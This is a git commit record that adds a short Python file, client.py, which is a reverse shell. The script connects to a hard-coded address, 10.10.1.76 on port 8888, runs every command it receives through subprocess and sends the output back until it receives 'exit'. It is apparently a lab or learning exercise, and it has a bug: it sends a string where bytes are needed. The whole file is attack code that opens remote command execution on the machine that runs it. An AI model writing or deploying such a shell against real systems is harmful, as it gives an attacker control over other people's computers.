f6a3a7977773aad8625c6e7da817ea25d8019c2c
pavil13 <max.petrochenco@gmail.com>
2022-06-23 13:16:11 +0300

    add client code

---
+++ client.py
@@ -0,0 +1,16 @@
+import socket
+import subprocess
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.10.1.76', 8888))
+
+while True:
+    command = s.recv(4096).decode()
+
+    if command.lower() == 'exit':
+        s.close()
+        break
+    else:
+        output = subprocess.getoutput(command)
+        s.send(output)
+s.close()
